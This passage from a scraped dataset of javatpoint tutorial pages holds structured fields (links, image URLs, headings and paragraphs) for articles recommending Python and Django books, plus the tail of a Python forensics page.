'`l', '`lz', '_', '_k', '_ky', 'j', 'jx', 'i', 'iw', 'h', 'hv', 'g', 'gu', 'f', 'ft', 'Virtual Machine dummy added successfully.', 'The client waits for connection', 'source INDIA >> destination USA', '11', '11', '-1', 'Index example :  1', 'Index for indexing :  3', 'Index of the character keyword found is', '10', '[255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]', 'List processing complete']","['|||Naming Convention|||Example|||||||||Local variables|||camelCase with optional underscore|||studentName|||||||||Constant|||Uppercase, words separated by underscores|||STUDENT_NAME|||||||||Global variable|||Prefix with camelCase with optional underscores|||my_studentName|||||||||Function|||PascalCase with optional underscores; active voice|||MystudentName|||||||||Module|||Prefix with the camel case|||_studentname|||||||||Class|||Prefix class with Pascalcase; keep it sort|||class_MyStudentName|||||||||Object|||Prefix ob_with camelcase|||ob_studentName|||&&&|||Local variables|||camelCase with optional underscore|||studentName|||||||||Constant|||Uppercase, words separated by underscores|||STUDENT_NAME|||||||||Global variable|||Prefix with camelCase with optional underscores|||my_studentName|||||||||Function|||PascalCase with optional underscores; active voice|||MystudentName|||||||||Module|||Prefix with the camel case|||_studentname|||||||||Class|||Prefix class with Pascalcase; keep it sort|||class_MyStudentName|||||||||Object|||Prefix ob_with camelcase|||ob_studentName|||&&&Local variables|||camelCase with optional underscore|||studentName&&&Constant|||Uppercase, words separated by underscores|||STUDENT_NAME&&&Global variable|||Prefix with camelCase with optional underscores|||my_studentName&&&Function|||PascalCase with optional underscores; active voice|||MystudentName&&&Module|||Prefix with the camel case|||_studentname&&&Class|||Prefix class with Pascalcase; keep it sort|||class_MyStudentName&&&Object|||Prefix ob_with camelcase|||ob_studentName']","['|||We can simply transform any hash value for any input value.|||It doesn\'t able to produce the same output as given hash value.|||It is unrealistic to transform the input without moving the hash value.||||||We can use the workstation in a validate state for each investigation.|||We can recover deleted data by including dd images of a drive on a virtual machine.|||The virtual machine can turn into the recovery device that will help to gather evidence.||||||reservedips - It is used to identify solutions for the DNS problems.|||rip-http - It extracts the files from HTTP traffic.|||large-flows - It is a decoder that represents the list net flows.|||Protocols - It identifies the non-standard protocols.|||dns - It extracts DNS-related queries.||||||Find the associated string ""password_salt"".|||The width of the salt file represents in the bytes. This is its length.|||This is the length which is actually searched to get the stored password/pin of the smartphones.||||||First, it needs to be selected the target of the investing.|||Acquire the forensics data.|||Forensics Analysis|||']"
137,['Best Books to Learn Python'],"['In this article, we will highlight some of the best collections of the books to learn Python. We will provide you a complete review of the books, the topic covered, and the context used to demonstrate those topics.']","['https://www.javatpoint.com/best-books-to-learn-django-for-beginners-and-advance-programmers', 'https://www.javatpoint.com/python-forensics-and-virtualization', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.amazon.com/Python-Crash-Course-2nd-Edition/dp/1593279280/ref=sr_1_1?crid=3TI5PO0GU6QFL&dchild=1&keywords=python+crash+course+3rd+edition&qid=1605436908&s=books&sprefix=Python+Crash+%2Cstripbooks-intl-ship%2C435&sr=1-1', 'https://www.javatpoint.com/https://www.flipkart.com/python-crash-course-2nd-edition/p/itmfcysk8dnuweg6?pid=9781593279288&lid=LSTBOK9781593279288P6JTO6&marketplace=FLIPKART&srno=s_1_1&otracker=AS_QueryStore_OrganicAutoSuggest_1_13_na_na_na&otracker1=AS_QueryStore_OrganicAutoSuggest_1_13_na_na_na&fm=SEARCH&iid=e3a590bb-d7d0-4fb5-ad6e-e6999d062496.9781593279288.SEARCH&ppt=sp&ppn=sp&ssid=a3j2oi3r8w0000001605437071589&qH=d116fb03b79b25df', 'https://www.javatpoint.com/https://www.amazon.com/Head-First-Python-Brain-Friendly-Guide/dp/1491919531/ref=sr_1_1?dchild=1&keywords=Head+First+Python&qid=1605437299&s=books&sr=1-1', 'https://www.javatpoint.com/https://www.flipkart.com/head-first-python-2nd-brain-friendly-guide/p/itmery7vevg4ehsv?pid=9789352134823&lid=LSTBOK9789352134823U5AEHI&marketplace=FLIPKART&srno=s_1_1&otracker=AS_QueryStore_OrganicAutoSuggest_1_16_na_na_ps&otracker1=AS_QueryStore_OrganicAutoSuggest_1_16_na_na_ps&fm=SEARCH&iid=ed02e067-5f75-4f95-8166-941f0e70fe74.9789352134823.SEARCH&ppt=sp&ppn=sp&ssid=xzwmqa6olc0000001605437187733&qH=5bf0114ca2bd7e1e', 'https://www.javatpoint.com/https://www.javatpoint.com/python-variables', 'https://www.javatpoint.com/https://www.javatpoint.com/python-data-types', 'https://www.javatpoint.com/https://www.javatpoint.com/python-operators', 'https://www.javatpoint.com/https://www.javatpoint.com/python-lists', 'https://www.javatpoint.com/https://www.javatpoint.com/python-cgi-programming', 'https://www.javatpoint.com/https://www.amazon.com/Python-Programming-Introduction-Computer-Science/dp/1590282752/ref=sr_1_1?crid=D5USAJRUEUU2&dchild=1&keywords=python+programming+an+introduction+to+computer+science&qid=1605437580&s=books&sprefix=python+programming+an+%2Cstripbooks-intl-ship%2C506&sr=1-1', 'https://www.javatpoint.com/https://www.flipkart.com/python-programming-introduction-computer-science/p/itme3agvhmvzfaz2?pid=9781887902991&lid=LSTBOK9781887902991VRCBJU&marketplace=FLIPKART&srno=s_1_3&otracker=search&otracker1=search&fm=SEARCH&iid=2a4d39ed-4125-4621-b982-023724279e84.9781887902991.SEARCH&ppt=sp&ppn=sp&ssid=fdxqwm8kzk0000001605437513211&qH=401454402fb0c8b8', 'https://www.javatpoint.com/https://www.amazon.com/Learn-Python-Hard-Way-Introduction/dp/0134692888/ref=sr_1_1?crid=29REPSZZX54L2&dchild=1&keywords=learn+python+the+hard+way+3rd+edition&qid=1605437667&s=books&sprefix=Learn+Python+the+%2Cstripbooks-intl-ship%2C424&sr=1-1', 'https://www.javatpoint.com/https://www.flipkart.com/learn-python-hard-way-1-disc/p/itmfbdkb3suh2etu?pid=9789332582101&lid=LSTBOK9789332582101UP8M9H&marketplace=FLIPKART&srno=s_1_1&otracker=AS_QueryStore_OrganicAutoSuggest_1_22_na_na_ps&otracker1=AS_QueryStore_OrganicAutoSuggest_1_22_na_na_ps&fm=SEARCH&iid=d6c7727a-12ec-4aa4-a297-f625541089f1.9789332582101.SEARCH&ppt=sp&ppn=sp&ssid=35zu9ukmds0000001605437699054&qH=cd14787cb091fde8', 'https://www.javatpoint.com/https://www.amazon.com/s?k=a+byte+of+python&crid=3KLSYLCJL7HFK&sprefix=A+Byte+%2Cstripbooks-intl-ship%2C517&ref=nb_sb_ss_fb_1_7', 'https://www.javatpoint.com/https://www.amazon.com/Learning-Python-5th-Mark-Lutz/dp/1449355730/ref=sr_1_1?crid=1G4ZM1PDHUZIF&dchild=1&keywords=learning+with+python&qid=1605437926&sprefix=Learning+with+Python%2Caps%2C412&sr=8-1', 'https://www.javatpoint.com/https://www.flipkart.com/learning-python/p/itmfbxzffrguf6k2?pid=9789351102014&lid=LSTBOK97893511020149PMRFC&marketplace=FLIPKART&srno=s_1_1&otracker=search&otracker1=search&fm=SEARCH&iid=d58ddb0c-cd96-4a59-b27b-2e90aa0e81c4.9789351102014.SEARCH&ppt=sp&ppn=sp&ssid=dugtnh4ffk0000001605437968009&qH=3764178f844fdbfc', 'https://www.javatpoint.com/https://www.amazon.com/Automate-Boring-Stuff-Python-2nd/dp/1593279922/ref=sr_1_1?crid=3BQ3AMHWHH5OI&dchild=1&keywords=automate+boring+stuff+with+python&qid=1605438086&sprefix=Automative+boring+stuff+with+Pyth%2Caps%2C428&sr=8-1', 'https://www.javatpoint.com/https://www.flipkart.com/automate-boring-stuff-python-2nd/p/itm5d7ffb1f34617?pid=9781593279929&lid=LSTBOK9781593279929FKEXPY&marketplace=FLIPKART&srno=s_1_1&otracker=AS_QueryStore_OrganicAutoSuggest_1_21_na_pm_na&otracker1=AS_QueryStore_OrganicAutoSuggest_1_21_na_pm_na&fm=SEARCH&iid=e7a297f2-0f26-40db-b85e-5ba6bf57022a.9781593279929.SEARCH&ppt=sp&ppn=sp&ssid=5w9335hei80000001605438115219&qH=9ee3fbdea596a8df', 'https://www.javatpoint.com/https://www.amazon.com/Introduction-Machine-Learning-Python-Scientists/dp/1449369413/ref=sr_1_1?crid=S6F8M7US11NW&dchild=1&keywords=introduction+to+machine+learning+with+python&qid=1605438294&sprefix=Introduction+to+Machine+%2Caps%2C480&sr=8-1', 'https://www.javatpoint.com/https://www.flipkart.com/introduction-machine-learning-python-guide-data-scientists/p/itmezh7mxenzjh5h?pid=9789352134571&lid=LSTBOK9789352134571ASGNKJ&marketplace=FLIPKART&srno=s_1_1&otracker=AS_QueryStore_OrganicAutoSuggest_1_27_na_na_ps&otracker1=AS_QueryStore_OrganicAutoSuggest_1_27_na_na_ps&fm=SEARCH&iid=1b687902-249c-4055-9fc9-69a80c225041.9789352134571.SEARCH&ppt=sp&ppn=sp&ssid=blv9b3txhc0000001605438257015&qH=f891991f3135cbd9', 'https://www.javatpoint.com/https://www.javatpoint.com/machine-learning', 'https://www.javatpoint.com/https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008/ref=sr_1_1?dchild=1&keywords=Fluent+Python&qid=1605438376&sr=8-1', 'https://www.javatpoint.com/https://www.flipkart.com/fluent-python-clear-concise-effective-programming/p/itmfbz8qt2kwmsjb?pid=9789352132058&lid=LSTBOK9789352132058MGDBGL&marketplace=FLIPKART&srno=s_1_1&otracker=AS_Query_OrganicAutoSuggest_1_12_na_na_ps&otracker1=AS_Query_OrganicAutoSuggest_1_12_na_na_ps&fm=SEARCH&iid=6b9a4fc3-98e3-47a9-a165-b756259db4fe.9789352132058.SEARCH&ppt=sp&ppn=sp&ssid=29tkbot8tc0000001605438409444&qH=7a03b114f9d0e0e4', 'https://www.javatpoint.com/https://www.amazon.com/Programming-Python-Powerful-Object-Oriented/dp/0596158106/ref=sr_1_1?crid=FBSUP938QX9D&dchild=1&keywords=programming+python&qid=1605438485&sprefix=Programming+Python%2Caps%2C435&sr=8-1', 'https://www.javatpoint.com/https://www.amazon.com/Python-Cookbook-Third-David-Beazley/dp/1449340377/ref=sr_1_1?crid=246M89WWFJSTX&dchild=1&keywords=python+cookbook&qid=1605438582&sprefix=Python+cookbook%2Caps%2C442&sr=8-1', 'https://www.javatpoint.com/https://www.flipkart.com/python-cookbook-3/p/itmegmt2tfttbxxk?pid=9789351101406&lid=LSTBOK97893511014066VSELA&marketplace=FLIPKART&srno=s_1_1&otracker=AS_QueryStore_OrganicAutoSuggest_1_12_na_na_ps&otracker1=AS_QueryStore_OrganicAutoSuggest_1_12_na_na_ps&fm=SEARCH&iid=5c5e967b-16aa-4666-b815-4c19c10194f7.9789351101406.SEARCH&ppt=sp&ppn=sp&ssid=mmgbvw09b40000001605438610513&qH=93d62b1e824e1123', 'https://www.javatpoint.com/https://www.amazon.com/Effective-Python-Specific-Software-Development/dp/0134853989/ref=sr_1_1?dchild=1&keywords=Effective+Python&qid=1605440433&sr=8-1', 'https://www.javatpoint.com/https://www.flipkart.com/effective-python-59-specific-ways-write-better-1st/p/itme8hfr38y5sapq?pid=9789332552364&lid=LSTBOK9789332552364TXDYLN&marketplace=FLIPKART&srno=s_1_1&otracker=search&otracker1=search&fm=SEARCH&iid=a6752cfd-8d28-42b1-9bfa-2c7afe5372c3.9789332552364.SEARCH&ppt=sp&ppn=sp&ssid=7dqjpfqc1c0000001605440486598&qH=a6a4b0411fa65731', 'https://www.javatpoint.com/https://www.amazon.com/Python-Kids-Playful-Introduction-Programming/dp/1593274076/ref=sr_1_2?dchild=1&keywords=python+for+kids&qid=1605438697&sr=8-2', 'https://www.javatpoint.com/https://www.flipkart.com/python-for-kids/p/itmfc39q6xewqgfu?pid=9781593274078&lid=LSTBOK9781593274078G1A6FV&marketplace=FLIPKART&srno=s_1_18&otracker=search&otracker1=search&fm=SEARCH&iid=4dfc6dfd-31e4-4108-ac11-4b7f8521eb13.9781593274078.SEARCH&ppt=sp&ppn=sp&ssid=mf3qztdpmo0000001605438724474&qH=ef764e270142fbfe', 'https://www.javatpoint.com/https://www.amazon.com/Teach-Your-Kids-Code-Parent-Friendly/dp/1593276141/ref=sr_1_1?dchild=1&keywords=Teach+your+kids+to+code&qid=1605438848&sr=8-1', 'https://www.javatpoint.com/https://www.flipkart.com/teach-your-kids-code/p/itmf3jqmpcsf7ygx?pid=9781593276140&lid=LSTBOK9781593276140TNUOG6&marketplace=FLIPKART&srno=s_1_1&otracker=search&otracker1=search&fm=SEARCH&iid=e325338e-8367-4954-ad41-3568f733fe96.9781593276140.SEARCH&ppt=sp&ppn=sp&ssid=z8zvu0fav40000001605438811913&qH=ae0bd80435ef67ff', 'https://www.javatpoint.com/https://www.amazon.com/Python-easy-steps-Covers-3-7/dp/1840788127/ref=sr_1_1?crid=6PPNBRDVK5I3&dchild=1&keywords=python+in+easy+steps+2nd+edition+mike+mcgrath&qid=1605438967&sprefix=Python+in+easy+%2Caps%2C428&sr=8-1', 'https://www.javatpoint.com/https://www.flipkart.com/python-makes-programming-fun/p/itmdx929wqpzhnaz?pid=9789351343080&lid=LSTBOK9789351343080MMGLI1&marketplace=FLIPKART&srno=s_1_1&otracker=search&otracker1=search&fm=SEARCH&iid=c535ba48-2498-4791-8ce5-d6ae6e053979.9789351343080.SEARCH&ppt=sp&ppn=sp&ssid=tth16wx2ps0000001605439003968&qH=47bd5cac12639fbb', 'https://www.javatpoint.com/best-books-to-learn-django-for-beginners-and-advance-programmers', 'https://www.javatpoint.com/python-forensics-and-virtualization', 'https://www.javatpoint.com/best-books-to-learn-django-for-beginners-and-advance-programmers']","['https://static.javatpoint.com/python/images/best-books-to-learn-python1.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python2.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python3.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python4.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python5.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python6.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python7.png', 'https://static.javatpoint.com/python/images/best-books-to-learn-python8.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python9.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python10.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python11.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python12.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python13.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python14.jpg', 'https://static.javatpoint.com/python/images/best-books-to-learn-python15.jpg']",[],"['Introduction', 'Best Python Books for Beginners', 'Conclusion']","['1. Python Crash Course', '2. Head-First Python, 2nd Edition', '3. Python Programming : An Introduction to Computer Science (3rd Edition)', '4. Learn Python the Hard Way', '5. A Byte of Python', '6. Learning with Python: How to Think Like a Computer Scientist', '7. Automating Boring Stuff with Python', '8. Introduction to Machine Learning with Python: A Guide for Data Scientist', '9. Fluent Python: Clear, Concise, and Efficient Programming', '10. Programming Python : Powerful Object-Oriented Programming', '11. Python Cookbook : Recipes for Mastering Python 3', '12. Effective Python: 59 Ways to Write Better Python', '13. Python for Kids: A Playful Introduction to Programming', '14. Teach Your Kids to Code: A Parent-Friendly Guide to Python Programming', '15. Python in Easy Step']",[],"[""There are various factors that affect the book's qualities such as style, presentation of book, reader's background, topic explanation, etc."", 'We have defined the books based on of following categories.', 'Below are the best Python books for kids, absolute beginners and expert programmers. The Python community recommends these books.', 'In this section, we figure out the best books for beginners if you are new to the Python then you can prefer these books.', 'Amazon - Python Crash Course', 'Flipkart - Python Crash Course', 'This book has 560 pages (can vary) and divides into two parts.', 'In the other section, topics like conditional statements and logical tests are concealed by the Python loop statements.', 'Amazon - Head-First Python', 'Flipkart - Head-First Python', 'Amazon - Python Programming', 'Flipkart - Python Programming', 'But it includes many useful examples.', 'Amazon - Learn Python the Hard Way', 'Flipkart - Learn Python the Hard Way', 'Amazon - A Byte of Python (Kindle Version)', 'This book is translated by the vigorous community members who dynamically work to keep the edits going on as the book is updated.', 'Amazon - Learning with Python', 'Flipkart - Learning with Python', 'Amazon - Automatic Boring Stuff with Python', 'Flipkart - Automatic Boring Stuff with Python', 'In this section, we have listed below best Python books for advanced programmers.', 'Amazon - Introduction to Machine Learning', 'Flipkart - Introduction to Machine Learning', 'If we summarize, this book is very helpful to enhance the data science and machine learning skills.', 'Amazon - Fluent Python', 'Flipkart - Fluent Python', 'Amazon - Programming Python', 'Amazon - Python Cookbook', 'Flipkart - Python Cookbook', 'Amazon - Effective Python', 'Flipkart - Effective Python', 'Each article is defined with the proper coding example, discussion, and list of thing to remember.', 'The articles are grouped into the following chapters.', 'We have listed below Python books for the kids.', 'Amazon - Python for Kids', 'Flipkart - Python for Kids', 'Amazon - Teach Your Kids to Code', 'Flipkart - Teach Your Kids to Code', 'Amazon - Python in Easy Step', 'Flipkart - Python in Easy Step', 'This book builds the strong foundation of Python programming language.']","['Python is the most versatile and amazing programming language. It can be used in every possible technical domain as rapid development and debugging, data science, web development, and a vast community.', 'Python Crash Course is written by Eric Matthews. This book includes a fast-paced and complete introduction to Python. It is a best book for beginners who wish to learn Python and write useful programs.', ""This first part primarily focuses on Python's most basic concept, such as data-types, operators, working through variables, strings, numbers, lists, and tuple with a suitable example."", 'This book is nicely organized and well-written. There is a wide range of exercises as well as challenging projects. It is one of the best books for beginners recommended by Python programmers.', 'Then, it goes to the file handling, exceptional handling and modules. Each topic includes exercises. A combining project is building a website for a school athlete coach using Python by a CGI (Common Gateway Interface).', 'This book is very stimulating and engaging. No one will feel bored while reading it. The third edition of these books is much successful, followed the path concealed by the first edition.', 'This book follows the time-tested approach to explain the computer science-related concept. The author modifies the third edition by removing the use of Python eval() function and a section that discussed its disadvantages.', 'A Byte of Python is written by C.H. Swaroop. It is the best book for the beginner audience to an understanding of a Python language. This book is on the latest Python version but it also helps to adapt the older version of the Python.', 'Apart from the English language, this book is available in 25 languages, including Swedish, Turkish, German, Ukrainian, French, Spanish, Russian, Portuguese, and Korean. We can assume the popularity of this book by availability in several languages.', ""If we compare it with a similar book, it doesn't go deep into some more advanced areas. It focuses on basic Python programming in a clear, straightforward and extensive way."", 'This book is written by the Al Sweigart. The author says - ""Don\'t spend your time doing work a well-trained monkey could do. Even if you\'ve never written a line of code, you can make your computer do the grunt work.""', 'This book covers advanced topics such as data structures, functions as objects, object oriented idioms Python data models and metaprogramming. Below are the features of the Python language.', 'It follows the specific approach to explain the commonly used tools, and programming techniques. Here, we find the many useful examples that show precise usage and common solutions.', 'Many topics are covered in this book, such as string, data structures, functions, iteration, modules, classes, concurrency, testing and debugging. There are suitable examples of each recipe, which helps reader to adapt the topic more efficiently.', 'Its independent articles provide the facility to focus on the topics that most applicable and interesting. We need to read one article at a time. Each article is two or four page lengthy.', 'The first activity is a turtle graphics library. The turtle library has a number of basic designs as drawing a rotated square, circle, rectangle, etc. This section improves the general concept related to Python graphics module.']","['The initial and vital step is to find a suitable resource to learn any new skill. Learning Python is like learning a new skill. A good resource makes the process of leaning easier. Fortunately, there are many books that will help to learn the basic concept and also advance of Python programming language. With plenty of resources, it can be really hard to find best book among them.', 'This book also defines functions, classes, and file handling, oops concepts and testing and debugging. We learn the working of a Python program and learn how to write short, clean and effective code. In the other section, you can learn the use for libraries or tools such as Numpy and matplotlib and create a magnificent visualization.', 'In the second part of the book, three major projects will enhance practical knowledge. Readers will also learn about 2D game development and web application and how to create them. This book provides complete guidance to install Django, set up a project, designs a model and many more related to web development.', ""Head-First Python is written Paul Barry. It is the best book for beginners. It offers a fast and informal way to learn Python's basic without having to effort through counterproductive tutorials and books. If you want to learn a thing in small chunks, fairly self-contained at a time, and want to learn with the example. Then, it is the best book for you. This book explains Python variables, data types, operators, lists and how to manipulate them."", 'Paul Barry works as a lecturer at the Institute of Technology Carlow in Ireland. He had years of experience in the I.T. industry. He has written many books such as First Head Programming, Head First Python and Programming the Network with Perl. Head First is an excellent book and contains interesting topics with the proper example.', 'Python programming is written by John Zelle which is the third edition of the original Python programming book. This book defines the entire Python topics introduction to the intermediate level. It also includes computer science, programming and other advanced concept related to Python. This book is the most suitable for beginners.', 'This book is written by the Zed A. Shaw. The word ""Hard"" in title may seem difficult for the beginners, but it is not like that. This is an author\'s way of using instruction to make thoroughly go through the chapters and practice what we have learned so far.', 'This book presents the fundamental concept of Python much effectively for the beginners. It sets a level basic to the complex topics. This book also includes the many instructions and exercise to enhance the Python knowledge. Keep aside the title; this book is very effective for the beginners.', 'This book starts with the introduction chapters of Python including installation guide, variables, data types, operators, and data structures. It also describes how Python has emerged as one of the most popular and useful programming languages in the programming world. Then, it shifts on to the Python advance concept and describes in the details, along with the example.', '""Learning with Python"" is written by Allen Downey, Jeff Elkner, and Chris Meyers. This book includes an introduction to Python programming and a practical approach to the language to create real-word programs. This book is divided into 20 sections and contains a contribution list. First, it explains Python\'s basic concept; then it moves on to the oops concepts, lists, stacks, queues, trees, and debugging. This book is freely available in various formats, including PDF, Postscript, HTML, and Gzipped Rar. It is also translated into various languages such as German, Italian, Spanish, and Czech.', 'The motive of this book is to cut off the repetitive task or say, ""not this again."" This book primarily focuses on eliminating repetitive tasks. It covers all necessary basic of the Python language. This book includes some nifty snippets of Python. These snippets help to automate a simple but boring task to be done in seconds instead of hours. It is an ideal book for beginners.', 'This book is written by Sarah Guido and Andreas C. Muller. Python is the most suitable language for machine learning. Nowadays, machine learning is getting much popular with emerging Artificial Intelligence. This book precisely defines how to build machine learning projects using the Python programming language. Machine learning is an integral ingredient of many commercial applications and projects and numbers of applications are rising over the years.', 'We learn to develop a rich machine-learning application using Python with step by step guide. This book explains machine learning libraries such as sci-kit-learn, scipy. It also defines fundamental concepts and uses of machine learning. Later, we learn the machine learning algorithms, the concept of pipelines, and advanced concepts for model evaluation.', ""'Fluent Python' is written by Luciano Ramalho. This book is best for who has solid foundation in basics of Python and wants to takes their skills to the next level. This book is also referring to the experienced programmers. It is well organized and well written so that each topic can read independently. After reading Fluent Python, we can write clear shorter, faster and readable code."", 'This book sets itself a most demanding language by defining code with examples and numbered call-outs lines of code to helpful descriptions. The writer of this book Luciano Ramalho was a web developer who also has worked with most substantial news portals in Brazil. Now, he has his own Python training company.', 'Programming Python is written by Mark Lutz. This book is ideal for those who have basic knowledge of Python programming and willing to learn advance concept of Python. This book includes deep discussion on various domains such as GUIs, the web, and system administration. This book also covers text processing, networking, database using Python, front-end scripting layers, and much more.', ""'Python Cookbook' is written by David Beazley and K. Jones. This book helps us to master our Python programming skills. This book includes recipes for an experienced programmer to take their skill to the zenith. It consists of modern tools and idioms rather than just standard coding. This book covers variety of topics, usage, and also large number of application domains."", 'As we know Python has vast community across the world. Python Cookbook is based on recipe which is a solution to many problems faced by the community. The author has targeted experienced Python developers looking to strengthen their understanding of various modern techniques in Python. This book also covers the introductory topics for absolute beginners.', 'This book is written by the Brett Slatkin. There are 59 independent articles that use to develop an understanding the core concept of the Python. It includes practices, lesser known functionality, and built-in tools. It begins with the simple topics and ending with the more complex and typically overlooked concept of classifying memory leaks.', ""'Python for Kids' is written Jason R. Briggs. This book is primarily focused on to teach Python to the kids in fun way. Despite its title, this book is for all ages. It includes the clear, easy, and comprehensive Python introduction. This book is straightforward and clear examples. It's a solid guide for someone who wants to get a good grounding in the Python basics."", 'In the beginning, we learn about the installation of Python on various operating systems such as Windows, Ubuntu Linux, OS X, etc. Then, it goes on to explain the introduction and use of the Python shell. Here we find the introduction some basic topic like variables and arithmetic operations.', 'In the first part of this book, there are two fun application projects. The first project is to build a single-player version of Pong, called Bounce. While building this project, reader will learn about the functional programming, classes and control flow. It also involves task of creating an interface using Tkinter.', 'The second project is to build side-scrolling video games. This book applies many same concepts and tasks as Bounce with more depth and increased complexity. We also come across the open source image manipulation program GIMP. This book is perfect if you are looking for a fun, introduction to Python programming.', 'This book is written by Bryson Payne. It is similar to the Python for kids but intended to work with a child (or children) to learn code. This book is a well written and effective way to teach children with problem-solving skills. This book also includes two projects.', 'In the next section, the variables, calculations and mathematics in Python are defined. The code explanation is very clear with explicit line-by-line details. While working with the turtle library, reader can improve the concepts like classes, functional programming, etc. What makes it the best book is its large number of programming challenges and the excellent summaries at the end of each chapter.', 'This book is written by Mike McGrath. It is suitable not only for children but also for middle school and up students. This book is well written and author has defined the coding concept in small, comprehensible chunks. This book covers the following topics majorly.', 'We have defined a few excellent Python books for all types of readers. It is hard to select which book is best for among them, but it depends on their choice. We define these books based on the three types of readers. If someone is beginner, check the best Python books for the beginner and if you have basic knowledge of Python then try the best books for advance learner. Hope, this article will help you find best Python book.']",[],[],[],"[""|||Python introductory books for those who are new to learn or beginners.|||The best Python books for kids.|||If someone has the basic knowledge of Python and wants to dig deeper to enhance the efficiency of code then check the best intermediate and advanced Python books.||||||Preface - It introduces Python's object oriented nature very efficiently.|||Function as Objects - It describes the concerns of functions being first-class objects.|||Control Flow - It covers the concepts of generators, context managers, yield statement, and concurrency using|||Metaprogramming - It also discovers the unknown aspect of classes, properties, discussing dynamic attributes, class decorators and attributes description.|||Data Structure - It covers sets, mapping, mutability, and sequences in the Python language.||||||Python Thinking - It provides information regarding perform common tasks and how Python is implemented.|||Functions - It defines how we can use the functions to clarify intention, reduce bugs, and how reuse the functions.|||Classes and Inheritance - It includes the best article on the Python classes.|||MetaClasses and Attributes - This book defines metaclasses, how to use them to write multi-threaded functionality.|||Concurrency and Parallelism - This chapter helps to create multi-threaded application in Python.|||Built-in Modules - It provides the basic introduction of Python built-in libraries.|||Collaboration - This chapter discusses the proper documentation, packing and dependencies.|||Production - It covers the much advance topic such as optimization, testing and memory utilization.||||||Variables|||Arithmetic Operators|||String|||Lists|||Tuples|||Dictionaries|||Turtle Library|||Conditional Statements|||Loops|||Functions|||Modules and More|||""]"
138,['Best Books to Learn Django for Beginners and Advance Programmers'],"[""In this article, we will discuss a few excellent books to learn Django for all readers. We will explore their features, books writing style, example explanations, topics covered and the number of projects defined in the book. Before exploring the book, let's have a brief introduction to Django.""]","['https://www.javatpoint.com/gcd-of-two-number-in-python', 'https://www.javatpoint.com/best-books-to-learn-python', 'https://www.javatpoint.com/https://www.javatpoint.com/django-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/https://www.amazon.in/Django-APIs-Build-web-Python-ebook/dp/B08FMVYVFR/ref=sr_1_1?dchild=1&keywords=Django+for+APIs&qid=1606894976&sr=8-1', 'https://www.javatpoint.com/https://www.javatpoint.com/restful-web-services-tutorial', 'https://www.javatpoint.com/https://www.amazon.in/Andrew-Pinkham/e/B0184QUCMM?ref=sr_ntt_srch_lnk_1&qid=1606895043&sr=8-1', 'https://www.javatpoint.com/https://www.flipkart.com/beginning-django-e-commerce/p/itmetj6p2hkcuyyh?pid=9781430225355&lid=LSTBOK9781430225355M2T4KL&marketplace=FLIPKART&srno=s_1_1&otracker=search&otracker1=search&fm=SEARCH&iid=3e84be39-c1c8-4ce4-9f95-5ea92d4ad80a.9781430225355.SEARCH&ppt=sp&ppn=sp&ssid=6t0noy93hc0000001606895151476&qH=2cf8b06abded96f7', 'https://www.javatpoint.com/https://www.javatpoint.com/html-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/css-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/xml-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/sql-tutorial', 'https://www.javatpoint.com/https://www.amazon.in/Lightweight-Django-Using-Websockets-Backbone/dp/9351108651/ref=sr_1_1?dchild=1&keywords=Lightweight+Django&qid=1606895207&sr=8-1', 'https://www.javatpoint.com/https://www.javatpoint.com/jquery-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/bootstrap-tutorial', 'https://www.javatpoint.com/https://www.amazon.in/Django-Design-Patterns-Practices-Industry-standard/dp/1788831349/ref=sr_1_1?dchild=1&keywords=5.+Django+Design+Pattern+and+Best+Practices&qid=1606895233&sr=8-1', 'https://www.javatpoint.com/https://www.amazon.in/Django-Example-powerful-reliable-applications/dp/1788472489/ref=sr_1_1?dchild=1&keywords=Django+2+by+Example&qid=1606895299&sr=8-1', 'https://www.javatpoint.com/https://www.javatpoint.com/javascript-tutorial', 'https://www.javatpoint.com/https://www.amazon.in/Two-Scoops-Django-1-11-Practices/dp/0692915729/ref=sr_1_2?dchild=1&keywords=Two+Scoop+of+Django&qid=1606895360&sr=8-2', 'https://www.javatpoint.com/https://www.amazon.in/Two-Scoops-Django-1-11-Practices/dp/0692915729/ref=sr_1_2?dchild=1&keywords=Two+Scoop+of+Django&qid=1606895360&sr=8-2', 